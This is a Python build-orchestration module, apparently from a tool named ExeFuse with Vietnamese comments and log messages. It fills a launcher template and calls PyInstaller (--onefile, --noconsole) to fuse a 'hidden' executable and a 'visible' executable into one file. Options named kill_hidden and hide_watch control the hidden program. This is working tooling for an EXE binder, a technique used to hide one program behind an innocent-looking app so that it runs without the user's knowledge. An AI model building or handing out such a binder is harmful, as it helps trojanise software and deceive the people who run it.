# -*- coding: utf-8 -*-
"""ExeFuse - dieu phoi build.

Doc launcher_template.py, thay cac token cau hinh, sau do goi PyInstaller
onefile de nhung launcher + 2 file EXE thanh 1 file thuc thi duy nhat.
"""

import importlib.util
import os
import re
import shutil
import subprocess
import sys
import threading
import uuid

BUILDER_DIR = os.path.dirname(os.path.abspath(__file__))
LAUNCHER_TEMPLATE = os.path.join(BUILDER_DIR, "launcher_template.py")

# Ten file nhung ben trong bundle (ten co dinh de tranh trung lap khi 2 file
# upload trung ten nhau).
HIDDEN_ASSET = "__hidden_app__.exe"
VISIBLE_ASSET = "__visible_app__.exe"

MAX_LOG_LINES = 1500
MAX_JOBS = 15

JOBS = {}
_LOCK = threading.Lock()


def pyinstaller_available():
    try:
        return importlib.util.find_spec("PyInstaller") is not None
    except Exception:
        return False


def pyinstaller_version():
    """Tra ve chuoi version cua PyInstaller, hoac None neu chua cai."""
    try:
        out = subprocess.run(
            [sys.executable, "-m", "PyInstaller", "--version"],
            capture_output=True, text=True, timeout=60,
        )
        version = (out.stdout or "").strip()
        return version or None
    except Exception:
        return None


def _safe_name(name, fallback="ExeFuse_App"):
    name = (name or "").strip()
    name = re.sub(r"[^\w\-. ]+", "", name, flags=re.UNICODE)
    name = name.strip().replace(" ", "_")
    return name or fallback


def _log(job, line=""):
    with _LOCK:
        log = job["log"]
        log.append(line)
        if len(log) > MAX_LOG_LINES:
            del log[: len(log) - MAX_LOG_LINES]


def _update(job, **fields):
    with _LOCK:
        for key, value in fields.items():
            job[key] = value


def create_job():
    job_id = uuid.uuid4().hex[:12]
    job = {
        "id": job_id,
        "status": "queued",
        "error": None,
        "result_path": None,
        "output_name": None,
        "log": [],
    }
    with _LOCK:
        JOBS[job_id] = job
        while len(JOBS) > MAX_JOBS:
            oldest = next(iter(JOBS))
            JOBS.pop(oldest, None)
    return job_id, job


def get_job(job_id):
    with _LOCK:
        job = JOBS.get(job_id)
        if job is None:
            return None
        return {
            "id": job["id"],
            "status": job["status"],
            "error": job.get("error"),
            "output_name": job.get("output_name"),
            "log": list(job["log"][-400:]),
        }


def get_result(job_id):
    with _LOCK:
        job = JOBS.get(job_id)
    if not job or job["status"] != "done":
        return None
    path = job.get("result_path")
    if not path or not os.path.isfile(path):
        return None
    return path, job.get("output_name") or os.path.basename(path)


def start_job(workdir, hidden_src, visible_src, output_name,
              kill_hidden=True, hide_watch=True, icon_src=None):
    """Tao job build chay nguon (background thread)."""
    if not pyinstaller_available():
        raise RuntimeError(
            "PyInstaller chưa được cài đặt. Hãy mở terminal và chạy: "
            "pip install pyinstaller"
        )
    job_id, job = create_job()
    thread = threading.Thread(
        target=_build_worker,
        args=(job, workdir, hidden_src, visible_src, output_name,
              bool(kill_hidden), bool(hide_watch), icon_src),
        daemon=True,
    )
    thread.start()
    return job_id


def _build_worker(job, workdir, hidden_src, visible_src, output_name,
                  kill_hidden, hide_watch, icon_src):
    try:
        _update(job, status="building")
        out_name = _safe_name(output_name)

        _log(job, "[ExeFuse] Bắt đầu build: %s" % out_name)
        _log(job, "[ExeFuse] Thư mục làm việc: %s" % workdir)

        # 1. Sinh launcher.py tu template
        with open(LAUNCHER_TEMPLATE, "r", encoding="utf-8") as f:
            template = f.read()
        launcher_src = (
            template
            .replace("%%HIDDEN_NAME%%", HIDDEN_ASSET)
            .replace("%%VISIBLE_NAME%%", VISIBLE_ASSET)
            .replace("%%KILL_HIDDEN%%", "True" if kill_hidden else "False")
            .replace("%%HIDE_WATCH%%", "True" if hide_watch else "False")
        )
        launcher_py = os.path.join(workdir, "launcher.py")
        with open(launcher_py, "w", encoding="utf-8") as f:
            f.write(launcher_src)
        _log(job, "[ExeFuse] Đã sinh launcher.py (kill_hidden=%s, hide_watch=%s)"
             % (kill_hidden, hide_watch))

        # 2. Copy 2 file upload voi ten asset co dinh
        hidden_asset = os.path.join(workdir, HIDDEN_ASSET)
        visible_asset = os.path.join(workdir, VISIBLE_ASSET)
        shutil.copyfile(hidden_src, hidden_asset)
        shutil.copyfile(visible_src, visible_asset)
        _log(job, "[ExeFuse] Nhúng file ẨN:   %s (%.1f MB)"
             % (HIDDEN_ASSET, os.path.getsize(hidden_asset) / 1048576.0))
        _log(job, "[ExeFuse] Nhúng file HIỆN: %s (%.1f MB)"
             % (VISIBLE_ASSET, os.path.getsize(visible_asset) / 1048576.0))
        if icon_src:
            _log(job, "[ExeFuse] Icon tùy chỉnh: app.ico")

        # 3. Goi PyInstaller
        #    Windows dung ';' con Linux/macOS dung ':' lam dau phan cach
        sep = ";" if os.name == "nt" else ":"
        dist_dir = os.path.join(workdir, "dist")
        build_dir = os.path.join(workdir, "pybuild")
        spec_dir = os.path.join(workdir, "spec")

        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconfirm",
            "--clean",
            "--noconsole",
            "--noupx",
            "--name", out_name,
            "--distpath", dist_dir,
            "--workpath", build_dir,
            "--specpath", spec_dir,
            "--add-binary", hidden_asset + sep + ".",
            "--add-binary", visible_asset + sep + ".",
        ]
        if icon_src:
            cmd += ["--icon", icon_src]
        cmd.append(launcher_py)

        _log(job, "[CMD] " + " ".join('"%s"' % part if " " in part else part
                                      for part in cmd))
        _log(job, "[PyInstaller] Đang đóng gói (30-120 giây)...")
        _log(job, "")

        proc = subprocess.Popen(
            cmd,
            cwd=workdir,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        for line in proc.stdout:
            line = line.rstrip()
            if line:
                _log(job, line)
        code = proc.wait()
        if code != 0:
            raise RuntimeError(
                "PyInstaller thoát với mã lỗi %d - xem log phía trên." % code
            )

        # 4. Tim file ket qua
        ext = ".exe" if os.name == "nt" else ""
        result = os.path.join(dist_dir, out_name + ext)
        if not os.path.isfile(result):
            candidates = []
            if os.path.isdir(dist_dir):
                candidates = [
                    os.path.join(dist_dir, name)
                    for name in os.listdir(dist_dir)
                    if os.path.isfile(os.path.join(dist_dir, name))
                ]
            if not candidates:
                raise RuntimeError("Không tìm thấy file kết quả trong dist/")
            result = candidates[0]

        size_mb = os.path.getsize(result) / 1048576.0
        _update(job, status="done", result_path=result,
                output_name=os.path.basename(result))
        _log(job, "")
        _log(job, "[OK] BUILD THÀNH CÔNG: %s (%.1f MB)"
             % (os.path.basename(result), size_mb))
    except Exception as exc:
        _update(job, status="failed", error=str(exc))
        _log(job, "")
        _log(job, "[LỖI] %s" % exc)
